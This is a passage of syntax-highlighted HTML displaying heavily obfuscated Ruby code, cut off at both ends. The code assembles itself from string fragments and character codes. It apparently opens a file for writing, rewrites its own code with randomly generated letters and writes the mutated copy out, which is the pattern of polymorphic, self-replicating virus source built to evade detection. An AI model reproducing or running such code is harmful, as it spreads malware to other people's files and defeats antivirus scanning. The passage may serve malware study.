style="color:#996600;">'b'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'='</span><span style="color:#006600; font-weight:bold;">+</span>okas<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'f.'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'d'</span><span style="color:#006600; font-weight:bold;">+</span>vzcu<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'46)'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>ylwf<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'f'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'clos'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'m'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'pen('</span><span style="color:#006600; font-weight:bold;">+</span>wrvn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>qhze<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'o'</span><span style="color:#006600; font-weight:bold;">+</span>syfp<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>xqfk<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">98</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>ueaz<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;w&quot;)'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">109</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'f'</span><span style="color:#006600; font-weight:bold;">+</span>ymek<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">119</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r'</span><span style="color:#006600; font-weight:bold;">+</span>gnzv<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'te(c'</span><span style="color:#006600; font-weight:bold;">+</span>sgzr<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span>sgge<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">41</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'whil'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>pttf<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">60</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'co'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">108</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'en'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">103</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'if'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>tuuz<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>kkwl<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>taot<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e['</span><span style="color:#006600; font-weight:bold;">+</span>plbx<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">',1]'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">49</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>ouij<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.chr'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'en'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'n'</span><span style="color:#006600; font-weight:bold;">+</span>wrat<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'wc'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'d'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'39.chr+&quot;+b'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>nixi<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>covt<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'39.'</span><span style="color:#006600; font-weight:bold;">+</span>nnjw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'h'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ls'</span><span style="color:#006600; font-weight:bold;">+</span>ifpt<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'code[i,1]=='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">51</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'2.c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'th'</span><span style="color:#006600; font-weight:bold;">+</span>bwiy<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'n'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'n'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>jjgv<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">111</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>oheh<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+'</span><span style="color:#006600; font-weight:bold;">+</span>gvmz<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>cxpe<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>ttjy<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>njpx<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;+b'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">115</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'&quot;+39'</span><span style="color:#006600; font-weight:bold;">+</span>vkjp<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ch'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">101</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'l'</span><span style="color:#006600; font-weight:bold;">+</span>asfu<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span>pran<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span>eoik<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'de'</span><span style="color:#006600; font-weight:bold;">+</span>bvle<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">44</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'1]'</span><span style="color:#006600; font-weight:bold;">+</span>uvvx<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'=92.chr'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span>uwbo<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'de[i'</span><span style="color:#006600; font-weight:bold;">+</span>mpta<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>pjor<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">']=='</span><span style="color:#006600; font-weight:bold;">+</span>havc<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'2.chr+&quot;s&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>rhet<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'hen'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ewcode+='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">51</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'chr+&quot;+bs+'</span><span style="color:#006600; font-weight:bold;">+</span>xdec<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>txwe<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9.chr'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'else'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ewcode+='</span><span style="color:#006600; font-weight:bold;">+</span>ndkt<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'.ch'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+'</span><span style="color:#006600; font-weight:bold;">+</span>lgtf<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>inuq<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'bn+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">34</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">51</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'chr'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'end'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'1'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'elsi'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'code[i'</span><span style="color:#006600; font-weight:bold;">+</span>uguw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'1]==95'</span><span style="color:#006600; font-weight:bold;">+</span>saba<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'chr'</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'the'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'new'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ode+'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">61</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'34'</span><span style="color:#006600; font-weight:bold;">+</span>emnf<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'chr+'</span><span style="color:#006600; font-weight:bold;">+</span>phdj<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'9.'</span><span style="color:#006600; font-weight:bold;">+</span>ucos<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'hr+&quot;'</span><span style="color:#006600; font-weight:bold;">+</span>geul<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'m'</span><span style="color:#006600; font-weight:bold;">+</span>xayn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'+&quot;+3'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">57</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">46</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'c'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r+34.chr'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i+='</span><span style="color:#006600; font-weight:bold;">+</span>ekau<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'el'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">115</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'e'</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">114</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'and(6'</span><span style="color:#006600; font-weight:bold;">+</span>iwok<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'i'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">102</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r=='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">48</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">116</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'he'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bn<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'v='</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">40</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'ran'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(26)+'</span><span style="color:#006600; font-weight:bold;">+</span>rhom<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>wxrt<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">').'</span><span style="color:#006600; font-weight:bold;">+</span>qcbu<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(ran'</span><span style="color:#006600; font-weight:bold;">+</span>qnke<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>zcas<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">50</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'6'</span><span style="color:#006600; font-weight:bold;">+</span>putq<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>bcug<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'7).'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">104</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'r+(r'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">97</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'n'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">100</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(26)+9'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">55</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">').'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">99</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'hr'</span><span style="color:#006600; font-weight:bold;">+</span>xygd<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'(r'</span><span style="color:#006600; font-weight:bold;">+</span>bhcw<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">110</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>dbjs<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>ezjl<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'26'</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">41</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">43</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">''</span><span style="color:#006600; font-weight:bold;">+</span>ttul<span style="color:#006600; font-weight:bold;">+</span><span style="color:#996600;">'7'</span><span style="color:#006600; font-weight:bold;">+</span>jooo<span style="color:#006600; 